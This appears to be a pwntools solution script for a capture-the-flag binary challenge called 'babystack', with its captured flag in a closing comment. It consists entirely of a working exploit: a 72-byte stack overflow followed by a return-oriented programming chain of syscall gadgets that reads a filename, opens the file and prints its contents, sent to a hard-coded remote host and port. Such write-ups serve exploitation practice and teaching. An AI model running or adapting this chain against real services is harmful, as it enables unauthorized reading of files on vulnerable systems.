#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('babystack.out')
# p = process(elf.path)
# gdb.attach(p, 'init-pwndbg\nb *0x4020F1')
p = remote('34.136.150.230', 49156)

filename = elf.bss(0x20)
buf = elf.bss(0x100)

syscall = 0x00000000004113b4
pop_rax = 0x0000000000410da4
pop_rdi = 0x00000000004018f4
pop_rsi_r15 = 0x00000000004018f2
pop_rdx = 0x000000000040182f

stuff = "A" * 72

payload = stuff

# read filename
payload += flat(
    pop_rdi, 0,
    pop_rsi_r15, filename, 0,
    pop_rdx, 0x100,
    pop_rax, 0,
    syscall
)

# open file
payload += flat(
    pop_rdi, filename,
    pop_rsi_r15, 0, 0,
    pop_rax, 2,
    syscall
)

# read into buffer
payload += flat(
    pop_rdi, 3,
    pop_rsi_r15, buf, 0,
    pop_rdx, 0x100,
    pop_rax, 0,
    syscall
)

# write to screen
payload += flat(
    pop_rdi, 1,
    pop_rsi_r15, buf, 0,
    pop_rdx, 0x100,
    pop_rax, 1,
    syscall
)

p.sendline(payload)
p.sendline("flag.txt\x00")

p.interactive()
# BSNoida{y0u_4r3_4_b4by_pwn3r_n0w_C7A5}

